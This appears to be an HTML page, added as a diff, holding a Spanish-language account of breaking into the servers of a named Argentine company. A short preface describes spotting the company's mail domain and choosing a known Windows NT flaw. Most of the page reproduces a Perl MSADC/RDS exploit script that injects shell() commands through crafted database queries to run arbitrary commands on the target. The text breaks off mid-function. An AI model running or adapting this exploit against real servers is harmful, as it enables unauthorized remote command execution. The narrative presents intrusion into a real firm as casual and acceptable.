@@ -1,0 +1,570 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="es-ar">
+<meta name="GENERATOR" content="">
+<meta name="ProgId" content="">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Intrusion a BUll</title>
+</head>
+
+<body text="#00FF00" bgcolor="#000000">
+
+<p><font face="OCR A Extended">Intrusion a BUll-ti</font></p>
+<p><font face="OCR A Extended">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</font></p>
+<p><font face="OCR A Extended">preface:</font></p>
+<p><font face="OCR A Extended">tenia una compañero que laburaba en bull (una 
+empresa de origen francesa con sede en argentina) y su email era
+<a href="mailto:xxxxxxx@bull-ti.com.ar">xxxxxxx@bull-ti.com.ar</a> y un día 
+recibo un email de el pero con otro dominio
+<a href="mailto:xxxxxx@integris.com.ar">xxxxxx@integris.com.ar</a> yo le envíe 
+un email preguntándole si había cambiando de laburo me dijo que no ..... 
+entonces empece a echarle el ojo a <a href="http://www.integris.com.ar">
+www.integris.com.ar</a> claro ahora este era servidor de mail y
+<a href="http://www.bull-ti.com.ar">www.bull-ti.com.ar</a>&nbsp; era la 
+pantalla.... resumiendo bull-ti era un microsoft ventanas nt 4 con millones de 
+fallos yo elegí el msadc.pl que me permitía ejecutar comandos como root, no 
+perdon como administrador</font></p>
+<p><font face="OCR A Extended">aquí esta el exploit que use:</font></p>
+<p><font face="OCR A Extended">--------------------------corte aqui campeon---------------------------------------------</font></p>
+<font SIZE="2">
+<p><font face="OCR A Extended">#!perl</font></p>
+<p><font face="OCR A Extended">#</font></p>
+<p><font face="OCR A Extended"># MSADC/RDS 'usage' (aka exploit) script</font></p>
+<p><font face="OCR A Extended">#</font></p>
+<p><font face="OCR A Extended"># by rain.forest.puppy</font></p>
+<p><font face="OCR A Extended">#</font></p>
+<p><font face="OCR A Extended"># Many thanks to Weld, Mudge, and Dildog from 
+l0pht for helping me</font></p>
+<p><font face="OCR A Extended"># beta test and find errors!</font></p>
+<p><font face="OCR A Extended">use Socket; use Getopt::Std;</font></p>
+<p><font face="OCR A Extended">getopts(&quot;e:vd:h:XRVN&quot;, \%args);</font></p>
+<p><font face="OCR A Extended">print &quot;-- RDS exploit by rain forest puppy / ADM 
+/ Wiretrip --\n&quot;;</font></p>
+<p><font face="OCR A Extended">if (!defined $args{h} &amp;&amp; !defined $args{R}) {</font></p>
+<p><font face="OCR A Extended">print qq~</font></p>
+<p><font face="OCR A Extended">Usage: msadc.pl -h &lt;host&gt; { -d &lt;delay&gt; -X -v }</font></p>
+<p><font face="OCR A Extended">-h &lt;host&gt; = host you want to scan (ip or domain)</font></p>
+<p><font face="OCR A Extended">-d &lt;seconds&gt; = delay between calls, default 1 
+second</font></p>
+<p><font face="OCR A Extended">-X = dump Index Server path table, if available</font></p>
+<p><font face="OCR A Extended">-N = query VbBusObj for NetBIOS name</font></p>
+<p><font face="OCR A Extended">-V = use VbBusObj instead of ActiveDataFactory</font></p>
+<p><font face="OCR A Extended">-v = verbose</font></p>
+<p><font face="OCR A Extended">-e = external dictionary file for step 5</font></p>
+<p><font face="OCR A Extended">Or a -R will resume a command session</font></p>
+<p><font face="OCR A Extended">~; exit;}</font></p>
+<p><font face="OCR A Extended">$ip=$args{h}; $clen=0; $reqlen=0; $|=1; $target=&quot;&quot;;</font></p>
+<p><font face="OCR A Extended">if (defined $args{v}) { $verbose=1; } else {$verbose=0;}
+</font></p>
+<p><font face="OCR A Extended">if (defined $args{d}) { $delay=$args{d};} else {$delay=1;}</font></p>
+<p><font face="OCR A Extended">if(!defined $args{R}){ $ip.=&quot;.&quot; if ($ip=~/[a-z]$/);</font></p>
+<p><font face="OCR A Extended">$target= inet_aton($ip) || die(&quot;inet_aton 
+problems; host doesn't exist?&quot;);}</font></p>
+<p><font face="OCR A Extended">if (!defined $args{R}){ $ret = &amp;has_msadc; }</font></p>
+<p><font face="OCR A Extended">if (defined $args{X} &amp;&amp; !defined $args{R}) { &amp;hork_idx; 
+exit; }</font></p>
+<p><font face="OCR A Extended">if (defined $args{N}) {&amp;get_name; exit;}</font></p>
+<p><font face="OCR A Extended">print &quot;Please type the NT commandline you want to 
+run (cmd /c assumed):\n&quot;</font></p>
+<p><font face="OCR A Extended">. &quot;cmd /c &quot;;</font></p>
+<p><font face="OCR A Extended">$in=&lt;STDIN&gt;; chomp $in;</font></p>
+<p><font face="OCR A Extended">$command=&quot;cmd /c &quot; . $in ;</font></p>
+<p><font face="OCR A Extended">if (defined $args{R}) {&amp;load; exit;}</font></p>
+<p><font face="OCR A Extended">print &quot;\nStep 1: Trying raw driver to 
+btcustmr.mdb\n&quot;;</font></p>
+<p><font face="OCR A Extended">&amp;try_btcustmr;</font></p>
+<p><font face="OCR A Extended">print &quot;\nStep 2: Trying to make our own DSN...&quot;;</font></p>
+<p><font face="OCR A Extended">&amp;make_dsn ? print &quot;&lt;&lt;success&gt;&gt;\n&quot; : print &quot;&lt;&lt;fail&gt;&gt;\n&quot;;</font></p>
+<p><font face="OCR A Extended">print &quot;\nStep 3: Trying known DSNs...&quot;;</font></p>
+<p><font face="OCR A Extended">&amp;known_dsn;</font></p>
+<p><font face="OCR A Extended">print &quot;\nStep 4: Trying known .mdbs...&quot;;</font></p>
+<p><font face="OCR A Extended">&amp;known_mdb;</font></p>
+<p><font face="OCR A Extended">if (defined $args{e}){</font></p>
+<p><font face="OCR A Extended">print &quot;\nStep 5: Trying dictionary of DSN names...&quot;;</font></p>
+<p><font face="OCR A Extended">&amp;dsn_dict; } else { &quot;\nNo -e; Step 5 skipped.\n\n&quot;; 
+}</font></p>
+<p><font face="OCR A Extended">print &quot;Sorry Charley...maybe next time?\n&quot;;</font></p>
+<p><font face="OCR A Extended">exit;</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub sendraw { # ripped and modded from whisker</font></p>
+<p><font face="OCR A Extended">sleep($delay); # it's a DoS on the server! At 
+least on mine...</font></p>
+<p><font face="OCR A Extended">my ($pstr)=@_;</font></p>
+<p><font face="OCR A Extended">socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) 
+||</font></p>
+<p><font face="OCR A Extended">die(&quot;Socket problems\n&quot;);</font></p>
+<p><font face="OCR A Extended">if(connect(S,pack &quot;SnA4x8&quot;,2,80,$target)){</font></p>
+<p><font face="OCR A Extended">select(S); $|=1;</font></p>
+<p><font face="OCR A Extended">print $pstr; my @in=&lt;S&gt;; </font></p>
+<p><font face="OCR A Extended">select(STDOUT); close(S); </font></p>
+<p><font face="OCR A Extended">return @in;</font></p>
+<p><font face="OCR A Extended">} else { die(&quot;Can't connect...\n&quot;); }}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub make_header { # make the HTTP request</font></p>
+<p><font face="OCR A Extended">my $which, $msadc; # yeah, this is WAY redundant. 
+I'll fix it later</font></p>
+<p><font face="OCR A Extended">if (defined $args{V}){</font></p>
+<p><font face="OCR A Extended">$msadc=&lt;&lt;EOT</font></p>
+<p><font face="OCR A Extended">POST /msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetRecordset 
+HTTP/1.1</font></p>
+<p><font face="OCR A Extended">User-Agent: ACTIVEDATA</font></p>
+<p><font face="OCR A Extended">Host: $ip</font></p>
+<p><font face="OCR A Extended">Content-Length: $clen</font></p>
+<p><font face="OCR A Extended">Connection: Keep-Alive</font></p>
+<p><font face="OCR A Extended">ADCClientVersion:01.06</font></p>
+<p><font face="OCR A Extended">Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; 
+num-args=2</font></p>
+<p><font face="OCR A Extended">--!ADM!ROX!YOUR!WORLD!</font></p>
+<p><font face="OCR A Extended">Content-Type: application/x-varg</font></p>
+<p><font face="OCR A Extended">Content-Length: $reqlen</font></p>
+<p><font face="OCR A Extended">EOT</font></p>
+<p><font face="OCR A Extended">; } else {</font></p>
+<p><font face="OCR A Extended">$msadc=&lt;&lt;EOT</font></p>
+<p><font face="OCR A Extended">POST /msadc/msadcs.dll/AdvancedDataFactory.Query 
+HTTP/1.1</font></p>
+<p><font face="OCR A Extended">User-Agent: ACTIVEDATA</font></p>
+<p><font face="OCR A Extended">Host: $ip</font></p>
+<p><font face="OCR A Extended">Content-Length: $clen</font></p>
+<p><font face="OCR A Extended">Connection: Keep-Alive</font></p>
+<p><font face="OCR A Extended">ADCClientVersion:01.06</font></p>
+<p><font face="OCR A Extended">Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; 
+num-args=3</font></p>
+<p><font face="OCR A Extended">--!ADM!ROX!YOUR!WORLD!</font></p>
+<p><font face="OCR A Extended">Content-Type: application/x-varg</font></p>
+<p><font face="OCR A Extended">Content-Length: $reqlen</font></p>
+<p><font face="OCR A Extended">EOT</font></p>
+<p><font face="OCR A Extended">;} </font></p>
+<p><font face="OCR A Extended">$msadc=~s/\n/\r\n/g;</font></p>
+<p><font face="OCR A Extended">return $msadc;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub make_req { # make the RDS request</font></p>
+<p><font face="OCR A Extended">my ($switch, $p1, $p2)=@_;</font></p>
+<p><font face="OCR A Extended">my $req=&quot;&quot;; my $t1, $t2, $query, $dsn;</font></p>
+<p><font face="OCR A Extended">if ($switch==1){ # this is the btcustmr.mdb query</font></p>
+<p><font face="OCR A Extended">$query=&quot;Select * from Customers where City=&quot; . 
+make_shell();</font></p>
+<p><font face="OCR A Extended">$dsn=&quot;driver={Microsoft Access Driver (*.mdb)};dbq=&quot; 
+.</font></p>
+<p><font face="OCR A Extended">$p1 . &quot;:\\&quot; . $p2 . &quot;\\help\\iis\\htm\\tutorial\\btcustmr.mdb;&quot;;}</font></p>
+<p><font face="OCR A Extended">elsif ($switch==2){ # this is general make table 
+query</font></p>
+<p><font face="OCR A Extended">$query=&quot;create table AZZ (B int, C varchar(10))&quot;;</font></p>
+<p><font face="OCR A Extended">$dsn=&quot;$p1&quot;;}</font></p>
+<p><font face="OCR A Extended">elsif ($switch==3){ # this is general exploit 
+table query</font></p>
+<p><font face="OCR A Extended">$query=&quot;select * from AZZ where C=&quot; . make_shell();</font></p>
+<p><font face="OCR A Extended">$dsn=&quot;$p1&quot;;}</font></p>
+<p><font face="OCR A Extended">elsif ($switch==4){ # attempt to hork file info 
+from index server</font></p>
+<p><font face="OCR A Extended">$query=&quot;select path from scope()&quot;;</font></p>
+<p><font face="OCR A Extended">$dsn=&quot;Provider=MSIDXS;&quot;;}</font></p>
+<p><font face="OCR A Extended">elsif ($switch==5){ # bad query</font></p>
+<p><font face="OCR A Extended">$query=&quot;select&quot;;</font></p>
+<p><font face="OCR A Extended">$dsn=&quot;$p1&quot;;}</font></p>
+<p><font face="OCR A Extended">$t1= make_unicode($query);</font></p>
+<p><font face="OCR A Extended">$t2= make_unicode($dsn);</font></p>
+<p><font face="OCR A Extended">if(defined $args{V}) { $req=&quot;&quot;; } else {$req = 
+&quot;\x02\x00\x03\x00&quot;; }</font></p>
+<p><font face="OCR A Extended">$req.= &quot;\x08\x00&quot; . pack (&quot;S1&quot;, length($t1));</font></p>
+<p><font face="OCR A Extended">$req.= &quot;\x00\x00&quot; . $t1 ;</font></p>
+<p><font face="OCR A Extended">$req.= &quot;\x08\x00&quot; . pack (&quot;S1&quot;, length($t2));</font></p>
+<p><font face="OCR A Extended">$req.= &quot;\x00\x00&quot; . $t2 ;</font></p>
+<p><font face="OCR A Extended">$req.=&quot;\r\n--!ADM!ROX!YOUR!WORLD!--\r\n&quot;;</font></p>
+<p><font face="OCR A Extended">return $req;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub make_shell { # this makes the shell() 
+statement</font></p>
+<p><font face="OCR A Extended">return &quot;'|shell(\&quot;$command\&quot;)|'&quot;;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub make_unicode { # quick little function to 
+convert to unicode</font></p>
+<p><font face="OCR A Extended">my ($in)=@_; my $out;</font></p>
+<p><font face="OCR A Extended">for ($c=0; $c &lt; length($in); $c++) { $out.=substr($in,$c,1) 
+. &quot;\x00&quot;; }</font></p>
+<p><font face="OCR A Extended">return $out;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub rdo_success { # checks for RDO return success 
+(this is kludge)</font></p>
+<p><font face="OCR A Extended">my (@in) = @_; my $base=content_start(@in);</font></p>
+<p><font face="OCR A Extended">if($in[$base]=~/multipart\/mixed/){</font></p>
+<p><font face="OCR A Extended">return 1 if( $in[$base+10]=~/^\x09\x00/ );}</font></p>
+<p><font face="OCR A Extended">return 0;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub make_dsn { # this makes a DSN for us</font></p>
+<p><font face="OCR A Extended">my @drives=(&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;);</font></p>
+<p><font face="OCR A Extended">print &quot;\nMaking DSN: &quot;;</font></p>
+<p><font face="OCR A Extended">foreach $drive (@drives) {</font></p>
+<p><font face="OCR A Extended">print &quot;$drive: &quot;;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(&quot;GET /scripts/tools/newdsn.exe?driver=Microsoft\%2B&quot; 
+.</font></p>
+<p><font face="OCR A Extended">&quot;Access\%2BDriver\%2B\%28*.mdb\%29\&amp;dsn=wicca\&amp;dbq=&quot;</font></p>
+<p><font face="OCR A Extended">. $drive . &quot;\%3A\%5Csys.mdb\&amp;newdb=CREATE_DB\&amp;attr= 
+HTTP/1.0\n\n&quot;);</font></p>
+<p><font face="OCR A Extended">$results[0]=~m#HTTP\/([0-9\.]+) ([0-9]+) 
+([^\n]*)#;</font></p>
+<p><font face="OCR A Extended">return 0 if $2 eq &quot;404&quot;; # not found/doesn't 
+exist</font></p>
+<p><font face="OCR A Extended">if($2 eq &quot;200&quot;) {</font></p>
+<p><font face="OCR A Extended">foreach $line (@results) {</font></p>
+<p><font face="OCR A Extended">return 1 if $line=~/&lt;H2&gt;Datasource creation 
+successful&lt;\/H2&gt;/;}}</font></p>
+<p><font face="OCR A Extended">} return 0;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub verify_exists {</font></p>
+<p><font face="OCR A Extended">my ($page)=@_;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(&quot;GET $page HTTP/1.0\n\n&quot;);</font></p>
+<p><font face="OCR A Extended">return $results[0];}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub try_btcustmr {</font></p>
+<p><font face="OCR A Extended">my @drives=(&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;);</font></p>
+<p><font face="OCR A Extended">my @dirs=(&quot;winnt&quot;,&quot;winnt35&quot;,&quot;winnt351&quot;,&quot;win&quot;,&quot;windows&quot;);</font></p>
+<p><font face="OCR A Extended">foreach $dir (@dirs) {</font></p>
+<p><font face="OCR A Extended">print &quot;$dir -&gt; &quot;; # fun status so you can see 
+progress</font></p>
+<p><font face="OCR A Extended">foreach $drive (@drives) {</font></p>
+<p><font face="OCR A Extended">print &quot;$drive: &quot;; # ditto</font></p>
+<p><font face="OCR A Extended">$reqlen=length( make_req(1,$drive,$dir) ) - 28;</font></p>
+<p><font face="OCR A Extended">$reqlenlen=length( &quot;$reqlen&quot; );</font></p>
+<p><font face="OCR A Extended">$clen= 206 + $reqlenlen + $reqlen;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(make_header() . make_req(1,$drive,$dir));</font></p>
+<p><font face="OCR A Extended">if (rdo_success(@results)){print &quot;Success!\n&quot;;save(1,1,$drive,$dir);exit;}</font></p>
+<p><font face="OCR A Extended">else { verbose(odbc_error(@results)); funky(@results);}} 
+print &quot;\n&quot;;}}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub odbc_error {</font></p>
+<p><font face="OCR A Extended">my (@in)=@_; my $base;</font></p>
+<p><font face="OCR A Extended">my $base = content_start(@in);</font></p>
+<p><font face="OCR A Extended">if($in[$base]=~/application\/x-varg/){ # it *SHOULD* 
+be this</font></p>
+<p><font face="OCR A Extended">$in[$base+4]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g;
+</font></p>
+<p><font face="OCR A Extended">$in[$base+5]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g;
+</font></p>
+<p><font face="OCR A Extended">$in[$base+6]=~s/[^a-zA-Z0-9 \[\]\:\/\\'\(\)]//g;
+</font></p>
+<p><font face="OCR A Extended">return $in[$base+4].$in[$base+5].$in[$base+6];}</font></p>
+<p><font face="OCR A Extended">print &quot;\nNON-STANDARD error. Please sent this 
+info to rfp\@wiretrip.net:\n&quot;;</font></p>
+<p><font face="OCR A Extended">print &quot;$in : &quot; . $in[$base] . $in[$base+1] . $in[$base+2] 
+. $in[$base+3] .</font></p>
+<p><font face="OCR A Extended">$in[$base+4] . $in[$base+5] . $in[$base+6]; exit;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub verbose {</font></p>
+<p><font face="OCR A Extended">my ($in)=@_;</font></p>
+<p><font face="OCR A Extended">return if !$verbose;</font></p>
+<p><font face="OCR A Extended">print STDOUT &quot;\n$in\n&quot;;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub save {</font></p>
+<p><font face="OCR A Extended">my ($p1, $p2, $p3, $p4)=@_;</font></p>
+<p><font face="OCR A Extended">open(OUT, &quot;&gt;rds.save&quot;) || print &quot;Problem saving 
+parameters...\n&quot;;</font></p>
+<p><font face="OCR A Extended">print OUT &quot;$ip\n$p1\n$p2\n$p3\n$p4\n&quot;;</font></p>
+<p><font face="OCR A Extended">close OUT;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub load {</font></p>
+<p><font face="OCR A Extended">my @p; my $drvst=&quot;driver={Microsoft Access Driver 
+(*.mdb)}; dbq=&quot;;</font></p>
+<p><font face="OCR A Extended">open(IN,&quot;&lt;rds.save&quot;) || die(&quot;Couldn't open 
+rds.save\n&quot;);</font></p>
+<p><font face="OCR A Extended">@p=&lt;IN&gt;; close(IN);</font></p>
+<p><font face="OCR A Extended">$ip=&quot;$p[0]&quot;; $ip=~s/\n//g; $ip.=&quot;.&quot; if ($ip=~/[a-z]$/);</font></p>
+<p><font face="OCR A Extended">$target= inet_aton($ip) || die(&quot;inet_aton 
+problems&quot;);</font></p>
+<p><font face="OCR A Extended">print &quot;Resuming to $ip ...&quot;;</font></p>
+<p><font face="OCR A Extended">$p[3]=&quot;$p[3]&quot;; $p[3]=~s/\n//g; $p[4]=&quot;$p[4]&quot;; 
+$p[4]=~s/\n//g;</font></p>
+<p><font face="OCR A Extended">if($p[1]==1) {</font></p>
+<p><font face="OCR A Extended">$reqlen=length( make_req(1,&quot;$p[3]&quot;,&quot;$p[4]&quot;) ) - 
+28;</font></p>
+<p><font face="OCR A Extended">$reqlenlen=length( &quot;$reqlen&quot; ); $clen= 206 + 
+$reqlenlen + $reqlen;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(make_header() . make_req(1,&quot;$p[3]&quot;,&quot;$p[4]&quot;));</font></p>
+<p><font face="OCR A Extended">if (rdo_success(@results)){print &quot;Success!\n&quot;;}</font></p>
+<p><font face="OCR A Extended">else { print &quot;failed\n&quot;; verbose(odbc_error(@results));}}</font></p>
+<p><font face="OCR A Extended">elsif ($p[1]==3){</font></p>
+<p><font face="OCR A Extended">if(run_query(&quot;$p[3]&quot;)){</font></p>
+<p><font face="OCR A Extended">print &quot;Success!\n&quot;;} else { print &quot;failed\n&quot;; }}</font></p>
+<p><font face="OCR A Extended">elsif ($p[1]==4){</font></p>
+<p><font face="OCR A Extended">if(run_query($drvst . &quot;$p[3]&quot;)){</font></p>
+<p><font face="OCR A Extended">print &quot;Success!\n&quot;; } else { print &quot;failed\n&quot;; }}</font></p>
+<p><font face="OCR A Extended">exit;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub create_table {</font></p>
+<p><font face="OCR A Extended">return 1 if (defined $args{V});</font></p>
+<p><font face="OCR A Extended">my ($in)=@_;</font></p>
+<p><font face="OCR A Extended">$reqlen=length( make_req(2,$in,&quot;&quot;) ) - 28;</font></p>
+<p><font face="OCR A Extended">$reqlenlen=length( &quot;$reqlen&quot; );</font></p>
+<p><font face="OCR A Extended">$clen= 206 + $reqlenlen + $reqlen;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(make_header() . make_req(2,$in,&quot;&quot;));</font></p>
+<p><font face="OCR A Extended">return 1 if rdo_success(@results);</font></p>
+<p><font face="OCR A Extended">my $temp= odbc_error(@results); verbose($temp);</font></p>
+<p><font face="OCR A Extended">return 1 if $temp=~/Table 'AZZ' already exists/;</font></p>
+<p><font face="OCR A Extended">return 0;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub known_dsn {</font></p>
+<p><font face="OCR A Extended"># we want 'wicca' first, because if step 2 made 
+the DSN, it's ready to go</font></p>
+<p><font face="OCR A Extended">my @dsns=(&quot;wicca&quot;, &quot;AdvWorks&quot;, &quot;pubs&quot;, &quot;CertSvr&quot;, 
+&quot;CFApplications&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;cfexamples&quot;, &quot;CFForums&quot;, &quot;CFRealm&quot;, &quot;cfsnippets&quot;, 
+&quot;UAM&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;banner&quot;, &quot;banners&quot;, &quot;ads&quot;, &quot;ADCDemo&quot;, &quot;ADCTest&quot;);</font></p>
+<p><font face="OCR A Extended">foreach $dSn (@dsns) {</font></p>
+<p><font face="OCR A Extended">print &quot;.&quot;;</font></p>
+<p><font face="OCR A Extended">next if (!is_access(&quot;DSN=$dSn&quot;));</font></p>
+<p><font face="OCR A Extended">if(create_table(&quot;DSN=$dSn&quot;)){</font></p>
+<p><font face="OCR A Extended">print &quot;$dSn successful\n&quot; if (!defined $args{V});</font></p>
+<p><font face="OCR A Extended">if(run_query(&quot;DSN=$dSn&quot;)){</font></p>
+<p><font face="OCR A Extended">print &quot;Success!\n&quot;; save (3,3,&quot;DSN=$dSn&quot;,&quot;&quot;); 
+exit; }}} print &quot;\n&quot;;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub is_access {</font></p>
+<p><font face="OCR A Extended">my ($in)=@_;</font></p>
+<p><font face="OCR A Extended">return 1 if (defined $args{V});</font></p>
+<p><font face="OCR A Extended">$reqlen=length( make_req(5,$in,&quot;&quot;) ) - 28;</font></p>
+<p><font face="OCR A Extended">$reqlenlen=length( &quot;$reqlen&quot; );</font></p>
+<p><font face="OCR A Extended">$clen= 206 + $reqlenlen + $reqlen;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(make_header() . make_req(5,$in,&quot;&quot;));</font></p>
+<p><font face="OCR A Extended">my $temp= odbc_error(@results);</font></p>
+<p><font face="OCR A Extended">verbose($temp); return 1 if ($temp=~/Microsoft 
+Access/);</font></p>
+<p><font face="OCR A Extended">return 0;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub run_query {</font></p>
+<p><font face="OCR A Extended">my ($in)=@_;</font></p>
+<p><font face="OCR A Extended">$reqlen=length( make_req(3,$in,&quot;&quot;) ) - 28;</font></p>
+<p><font face="OCR A Extended">$reqlenlen=length( &quot;$reqlen&quot; );</font></p>
+<p><font face="OCR A Extended">$clen= 206 + $reqlenlen + $reqlen;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(make_header() . make_req(3,$in,&quot;&quot;));</font></p>
+<p><font face="OCR A Extended">return 1 if rdo_success(@results);</font></p>
+<p><font face="OCR A Extended">my $temp= odbc_error(@results); verbose($temp);</font></p>
+<p><font face="OCR A Extended">return 0;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub known_mdb {</font></p>
+<p><font face="OCR A Extended">my @drives=(&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;);</font></p>
+<p><font face="OCR A Extended">my @dirs=(&quot;winnt&quot;,&quot;winnt35&quot;,&quot;winnt351&quot;,&quot;win&quot;,&quot;windows&quot;);</font></p>
+<p><font face="OCR A Extended">my $dir, $drive, $mdb;</font></p>
+<p><font face="OCR A Extended">my $drv=&quot;driver={Microsoft Access Driver (*.mdb)}; 
+dbq=&quot;;</font></p>
+<p><font face="OCR A Extended"># this is sparse, because I don't know of many</font></p>
+<p><font face="OCR A Extended">my @sysmdbs=( &quot;\\catroot\\icatalog.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\help\\iishelp\\iis\\htm\\tutorial\\eecustmr.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\system32\\certmdb.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\system32\\certlog\\certsrv.mdb&quot; ); #these are 
+%systemroot%</font></p>
+<p><font face="OCR A Extended">my @mdbs=( &quot;\\cfusion\\cfapps\\cfappman\\data\\applications.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\cfapps\\forums\\forums_.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\cfapps\\forums\\data\\forums.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\cfapps\\security\\realm_.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\cfapps\\security\\data\\realm.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\database\\cfexamples.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\database\\cfsnippets.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\inetpub\\iissamples\\sdk\\asp\\database\\authors.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\progra~1\\common~1\\system\\msadc\\samples\\advworks.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\brighttiger\\database\\cleam.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\database\\smpolicy.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\cfusion\\database\cypress.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\progra~1\\ableco~1\\ablecommerce\\databases\\acb2_main1.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\website\\cgi-win\\dbsample.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\perl\\prk\\bookexamples\\modsamp\\database\\contact.mdb&quot;,</font></p>
+<p><font face="OCR A Extended">&quot;\\perl\\prk\\bookexamples\\utilsamp\\data\\access\\prk.mdb&quot;</font></p>
+<p><font face="OCR A Extended">); #these are just \</font></p>
+<p><font face="OCR A Extended">foreach $drive (@drives) {</font></p>
+<p><font face="OCR A Extended">foreach $dir (@dirs){</font></p>
+<p><font face="OCR A Extended">foreach $mdb (@sysmdbs) {</font></p>
+<p><font face="OCR A Extended">print &quot;.&quot;;</font></p>
+<p><font face="OCR A Extended">if(create_table($drv . $drive . &quot;:\\&quot; . $dir . 
+$mdb)){</font></p>
+<p><font face="OCR A Extended">print &quot;\n&quot; . $drive . &quot;:\\&quot; . $dir . $mdb . &quot; 
+successful\n&quot; if</font></p>
+<p><font face="OCR A Extended">(!defined $args{V});</font></p>
+<p><font face="OCR A Extended">if(run_query($drv . $drive . &quot;:\\&quot; . $dir . $mdb)){</font></p>
+<p><font face="OCR A Extended">print &quot;Success!\n&quot;; save (4,4,$drive . &quot;:\\&quot; . 
+$dir . $mdb,&quot;&quot;); exit; </font></p>
+<p><font face="OCR A Extended">}}}}}</font></p>
+<p><font face="OCR A Extended">foreach $drive (@drives) {</font></p>
+<p><font face="OCR A Extended">foreach $mdb (@mdbs) {</font></p>
+<p><font face="OCR A Extended">print &quot;.&quot;;</font></p>
+<p><font face="OCR A Extended">if(create_table($drv . $drive . $dir . $mdb)){</font></p>
+<p><font face="OCR A Extended">print &quot;\n&quot; . $drive . $dir . $mdb . &quot; successful\n&quot; 
+if</font></p>
+<p><font face="OCR A Extended">(!defined {V});</font></p>
+<p><font face="OCR A Extended">if(run_query($drv . $drive . &quot;:&quot; . $dir . $mdb)){</font></p>
+<p><font face="OCR A Extended">print &quot;Success!\n&quot;; save (4,4,$drive . $dir . 
+$mdb,&quot;&quot;); exit; </font></p>
+<p><font face="OCR A Extended">}}}}</font></p>
+<p><font face="OCR A Extended">}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub hork_idx {</font></p>
+<p><font face="OCR A Extended">print &quot;\nAttempting to dump Index Server tables...\n&quot;;</font></p>
+<p><font face="OCR A Extended">print &quot; NOTE: Sometimes this takes a while, other 
+times it stalls\n\n&quot;;</font></p>
+<p><font face="OCR A Extended">$reqlen=length( make_req(4,&quot;&quot;,&quot;&quot;) ) - 28;</font></p>
+<p><font face="OCR A Extended">$reqlenlen=length( &quot;$reqlen&quot; );</font></p>
+<p><font face="OCR A Extended">$clen= 206 + $reqlenlen + $reqlen;</font></p>
